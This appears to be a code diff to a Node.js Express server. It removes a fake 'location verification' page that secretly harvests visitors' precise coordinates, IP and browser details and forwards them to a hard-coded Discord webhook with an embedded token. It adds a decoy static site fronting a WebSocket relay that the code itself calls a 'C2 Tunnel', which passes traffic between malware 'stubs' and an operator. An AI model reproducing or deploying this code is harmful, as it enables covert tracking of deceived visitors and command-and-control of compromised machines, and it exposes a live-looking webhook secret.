@@ -1,278 +1,129 @@
 const express = require('express');
+const http = require('http');
+const WebSocket = require('ws');
+const crypto = require('crypto');
+const path = require('path');
 
 const app = express();
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ noServer: true });
+
 const port = process.env.PORT || 10000;
 
-// Middleware
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+let tunnelWs = null;
+const activeConnections = new Map();
 
-// Root route - serves HTML directly from code (no external file needed)
-app.get('/', (req, res) => {
-  res.send(`
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Verification</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #1a1a2e;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #fff;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            background: rgba(255,255,255,0.1);
-            border-radius: 20px;
-            padding: 40px;
-            text-align: center;
-            max-width: 500px;
-        }
-        h1 {
-            font-size: 28px;
-            margin-bottom: 20px;
-            color: #00ff88;
-        }
-        p {
-            margin-bottom: 20px;
-            line-height: 1.6;
-            color: #ccc;
-        }
-        button {
-            background: #00ff88;
-            border: none;
-            color: #1a1a2e;
-            font-size: 18px;
-            font-weight: bold;
-            padding: 14px 40px;
-            border-radius: 50px;
-            cursor: pointer;
-            margin: 10px;
-        }
-        button:hover {
-            background: #00cc6a;
-        }
-        .status {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 10px;
-            background: rgba(0,0,0,0.5);
-            font-size: 14px;
-            display: none;
-        }
-        .status.success {
-            background: rgba(0,255,136,0.2);
-            border: 1px solid #00ff88;
-            color: #00ff88;
-        }
-        .status.error {
-            background: rgba(255,0,0,0.2);
-            border: 1px solid #ff4444;
-            color: #ff8888;
-        }
-        .coordinates {
-            font-family: monospace;
-            font-size: 14px;
-            margin-top: 15px;
-            padding: 10px;
-            background: rgba(0,0,0,0.5);
-            border-radius: 8px;
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #666;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Location Verification Required</h1>
-        <p>This system requires location access to verify your identity.</p>
-        <p>Click the button below to share your location.</p>
-        <button id="requestLocation">Access Location</button>
-        <div id="status" class="status"></div>
-        <div id="coordinatesDisplay" class="coordinates" style="display:none;"></div>
-        <div class="footer">Your location is used for verification purposes only.</div>
-    </div>
+function generateId() {
+  return crypto.randomBytes(8).toString('hex');
+}
 
-    <script>
-        var statusDiv = document.getElementById('status');
-        var coordsDiv = document.getElementById('coordinatesDisplay');
-        
-        function showStatus(message, isError) {
-            statusDiv.textContent = message;
-            statusDiv.className = isError ? 'status error' : 'status success';
-            statusDiv.style.display = 'block';
-            if (!isError) {
-                setTimeout(function() {
-                    statusDiv.style.display = 'none';
-                }, 5000);
-            }
-        }
+// Serve static decoy website from public directory
+app.use(express.static(path.join(__dirname, 'public')));
 
-        function sendToServer(data) {
-            fetch('/api/location', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            })
-            .then(function(response) {
-                return response.json();
-            })
-            .then(function(data) {
-                console.log('Server response:', data);
-            })
-            .catch(function(error) {
-                console.error('Error sending to server:', error);
-            });
-        }
-
-        function getLocation() {
-            if (!navigator.geolocation) {
-                showStatus('Geolocation is not supported by your browser.', true);
-                return;
-            }
-
-            showStatus('Requesting location... Please allow permission when prompted.', false);
-            
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    var coords = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform
-                    };
-                    
-                    coordsDiv.innerHTML = 'Location Captured:<br>' +
-                        'Latitude: ' + coords.latitude + '<br>' +
-                        'Longitude: ' + coords.longitude + '<br>' +
-                        'Accuracy: +-' + Math.round(coords.accuracy) + ' meters<br>' +
-                        'Time: ' + coords.timestamp;
-                    coordsDiv.style.display = 'block';
-                    
-                    sendToServer(coords);
-                    
-                    // Send to Discord webhook
-                    fetch('/api/location/discord', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(coords)
-                    }).catch(function(e) {
-                        console.log('Discord webhook error:', e);
-                    });
-                    
-                    showStatus('Location captured and verified. You may close this window.', false);
-                },
-                function(error) {
-                    var errorMsg = '';
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMsg = 'Permission denied. Please allow location access and try again.';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMsg = 'Location information is unavailable.';
-                            break;
-                        case error.TIMEOUT:
-                            errorMsg = 'Location request timed out.';
-                            break;
-                        default:
-                            errorMsg = 'An unknown error occurred.';
-                    }
-                    showStatus(errorMsg, true);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
-            );
-        }
-
-        document.getElementById('requestLocation').addEventListener('click', getLocation);
-    </script>
-</body>
-</html>
-  `);
-});
-
-// Location API endpoint - receives coordinates from the webpage
-app.post('/api/location', (req, res) => {
-  const locationData = req.body;
-  const timestamp = new Date().toISOString();
-  
-  console.log('='.repeat(50));
-  console.log(`[LOCATION] ${timestamp}`);
-  console.log(`  IP: ${req.ip || 'unknown'}`);
-  console.log(`  Latitude: ${locationData.latitude}`);
-  console.log(`  Longitude: ${locationData.longitude}`);
-  console.log(`  Accuracy: ${locationData.accuracy} meters`);
-  console.log(`  User Agent: ${locationData.userAgent || 'unknown'}`);
-  console.log('='.repeat(50));
-  
-  // Store in memory
-  if (!global.locations) {
-    global.locations = [];
-  }
-  global.locations.push({
-    timestamp,
-    ip: req.ip,
-    ...locationData
-  });
-  
-  res.json({ status: 'ok', message: 'Location received', id: global.locations.length });
-});
-
-// Discord webhook endpoint
-app.post('/api/location/discord', (req, res) => {
-  const locationData = req.body;
-  const discordWebhook = 'https://discord.com/api/webhooks/1481421187211858021/ouKVnU8Zage6vToMZQ4aqRHKMp2ZsuYgGqit9i3Wqwr2L4H1bzsOVy6xrtXFl0fS7Eaw';
-  
-  const message = {
-    content: `**New Location Captured**\nLatitude: ${locationData.latitude}\nLongitude: ${locationData.longitude}\nAccuracy: ${locationData.accuracy}m\nTime: ${locationData.timestamp}`
-  };
-  
-  // Send to Discord (don't wait for response)
-  fetch(discordWebhook, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(message)
-  }).catch(e => console.log('Discord webhook error:', e));
-  
-  res.json({ status: 'ok' });
-});
-
-// View all stored locations
-app.get('/api/locations', (req, res) => {
-  res.json({
-    total: global.locations?.length || 0,
-    locations: global.locations || []
-  });
-});
-
-// Ping endpoint for health checks
 app.get('/ping', (req, res) => {
   res.send('ok');
 });
 
-// Start the server
-app.listen(port, () => {
-  console.log(`Server running on port ${port}`);
-  console.log(`Visit https://proxy-nhno.onrender.com/`);
-  console.log(`Location API ready at /api/location`);
-  console.log(`View locations at /api/locations`);
+// Fallback to serving index.html for other HTTP requests
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// WebSocket connection handler
+wss.on('connection', (ws, req) => {
+  const rawUrl = req.url || '';
+  // Normalize path by replacing duplicate slashes
+  const normalizedUrl = rawUrl.replace(/\/+/g, '/');
+
+  if (normalizedUrl.startsWith('/_tunnel')) {
+    if (tunnelWs) {
+      console.log('Replacing existing tunnel connection.');
+      try {
+        tunnelWs.close();
+      } catch (err) {}
+    }
+    tunnelWs = ws;
+    console.log('C2 Tunnel connected successfully.');
+
+    ws.on('message', (message) => {
+      try {
+        const payload = JSON.parse(message.toString());
+        if (payload.type === 'ws_message') {
+            const clientWs = activeConnections.get(payload.req_id);
+            if (clientWs && clientWs.readyState === WebSocket.OPEN) {
+                clientWs.send(payload.data);
+            }
+        } else if (payload.type === 'ws_close') {
+            const clientWs = activeConnections.get(payload.req_id);
+            if (clientWs) {
+                clientWs.close();
+                activeConnections.delete(payload.req_id);
+            }
+        }
+      } catch (err) {
+        console.error('Tunnel message error:', err);
+      }
+    });
+
+    ws.on('close', () => {
+      console.log('C2 Tunnel disconnected.');
+      if (tunnelWs === ws) {
+        tunnelWs = null;
+        for (const [id, clientWs] of activeConnections.entries()) {
+          try {
+            clientWs.close();
+          } catch (err) {}
+        }
+        activeConnections.clear();
+      }
+    });
+    return;
+  }
+
+  // Handle Stub WebSocket connections
+  if (!tunnelWs || tunnelWs.readyState !== WebSocket.OPEN) {
+    ws.close(1011, 'Tunnel not connected');
+    return;
+  }
+
+  const reqId = generateId();
+  activeConnections.set(reqId, ws);
+
+  tunnelWs.send(JSON.stringify({
+    type: 'ws_connect',
+    req_id: reqId,
+    url: req.url,
+    headers: req.headers
+  }));
+
+  ws.on('message', (message) => {
+    if (tunnelWs && tunnelWs.readyState === WebSocket.OPEN) {
+      tunnelWs.send(JSON.stringify({
+        type: 'ws_message',
+        req_id: reqId,
+        data: message.toString() // stubs send JSON string frames
+      }));
+    }
+  });
+
+  ws.on('close', () => {
+    activeConnections.delete(reqId);
+    if (tunnelWs && tunnelWs.readyState === WebSocket.OPEN) {
+      tunnelWs.send(JSON.stringify({
+        type: 'ws_close',
+        req_id: reqId
+      }));
+    }
+  });
+});
+
+// Handle HTTP upgrades to WebSocket
+server.on('upgrade', (request, socket, head) => {
+  wss.handleUpgrade(request, socket, head, (ws) => {
+    wss.emit('connection', ws, request);
+  });
+});
+
+server.listen(port, () => {
+  console.log(`Render Tunnel Proxy listening on port ${port}`);
 });
